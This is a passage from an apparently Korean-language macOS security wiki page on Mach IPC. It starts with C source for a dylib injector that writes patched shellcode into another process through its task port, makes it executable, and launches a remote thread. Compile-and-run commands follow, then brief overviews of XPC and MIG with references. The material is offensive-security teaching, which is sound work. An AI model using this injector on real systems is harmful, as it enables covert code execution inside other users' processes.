if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"원격 스레드의 코드에 대한 메모리 권한 설정 실패: 오류 %s\n", mach_error_string(kr));
return (-4);
}

// 할당된 스택 메모리의 권한 설정
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"원격 스레드의 스택에 대한 메모리 권한 설정 실패: 오류 %s\n", mach_error_string(kr));
return (-4);
}


// 쉘코드를 실행할 스레드 생성
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // 실제 스택
//remoteStack64 -= 8;  // 16의 배수 정렬 필요

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("원격 스택 64  0x%llx, 원격 코드는 %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"원격 스레드 생성 실패: 오류 %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "사용법: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: 디스크에 있는 dylib 경로\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib를 찾을 수 없음\n");
}

}
```
</details>  

맥 OS IPC (Inter-Process Communication)은 맥 OS 아키텍처의 중요한 부분입니다. IPC는 프로세스 간 통신을 가능하게 하며, 프로세스 간 데이터 교환 및 협력을 허용합니다. IPC는 시스템 내에서 권한 상승을 시도하는 해커들에게 유용한 공격 표면을 제공할 수 있습니다.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### 태스크 포트를 통한 스레드 하이재킹 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

이 기술에서는 프로세스의 스레드가 하이재킹됩니다:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### 기본 정보

XPC는 macOS 및 iOS에서 **프로세스 간 통신**을 위한 XNU( macOS에서 사용되는 커널) 인터프로세스 통신을 나타냅니다. XPC는 시스템 내의 **다른 프로세스 간에 안전한 비동기 메소드 호출을 수행하는 메커니즘**을 제공합니다. 이는 Apple의 보안 패러다임의 일부로, **권한이 분리된 응용 프로그램을 생성**할 수 있게 해줍니다. 각 **구성 요소**가 **필요한 권한만 가지고** 작업을 수행하므로, **컴프라마이즈된 프로세스로부터의 잠재적인 피해를 제한**합니다.

이 **통신이 작동하는 방식** 및 **취약할 수 있는 방법**에 대한 자세한 정보는 확인하세요:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG는 Mach IPC 코드 생성 과정을 **간단화**하기 위해 만들어졌습니다. 주어진 정의에 따라 서버와 클라이언트가 통신할 수 있도록 **필요한 코드를 생성**합니다. 생성된 코드가 어색하더라도, 개발자는 그것을 가져와서 이전보다 훨씬 간단한 코드를 작성할 수 있습니다.

자세한 정보는 확인하세요:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## 참고 자료

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
